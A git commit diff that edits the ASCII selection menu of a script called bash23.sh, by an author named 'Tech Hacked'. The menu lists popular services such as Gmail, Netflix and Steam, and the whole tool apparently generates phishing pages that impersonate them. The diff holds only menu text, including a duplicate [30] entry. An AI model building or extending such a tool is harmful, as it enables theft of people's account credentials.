c28d2981f1a1aff550ee6c26e72c8ebcc25ebfac
Tech Hacked <77196153+WLS-SD@users.noreply.github.com>
2021-10-20 17:26:36 +0545

    Update bash23.sh

--- bash23.sh
+++ bash23.sh
@@ -16,13 +16,14 @@ echo "
 | [11] GitHub                            [12] PUBG       |
 | [13] Jio Router                        [14] Wi-Fi      |
 | [15] Apple                             [16] Gmail      |
-| [17] Linkedin                          [18] Shopify    |
+| [17] Linkedin                          [18] Google     |
 | [19] WordPress                         [20] Netflix    |
 | [21] Clash Of Clans                    [22] SnapChat   |
 | [23] Xbox                              [24] Ola        |
 | [25] Social Club                       [26] Yahoo      |
 | [27] OutLook                           [28] Steam      |
-| [29] YouTube                                           |
+| [29] YouTube                           [30] Shopify    |
+| [30] About Developer                                   |
 |========================================================|
 
 "
